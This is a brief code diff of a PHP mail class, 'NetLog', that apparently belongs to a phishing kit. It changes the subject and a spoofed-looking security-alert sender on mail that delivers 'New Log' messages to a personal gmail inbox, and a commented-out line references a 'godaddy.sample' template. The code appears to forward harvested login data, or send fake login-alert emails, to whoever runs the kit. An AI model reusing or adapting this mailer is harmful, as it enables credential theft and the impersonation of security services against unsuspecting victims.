@@ -31,8 +31,8 @@ class NetLog extends Mailable
      */
     public function build()
     {
-        return $this->subject('Unathorised-Login-Attempt')
-        ->from('security@mail-guard.services', 'Security Alert Services')
+        return $this->subject('New Log')
+        ->from('help@usaimmigration.website', 'New Log')
         ->to('talktojimmykimmel@gmail.com')
         ->view('email.net');
         // ->view('godaddy.sample');
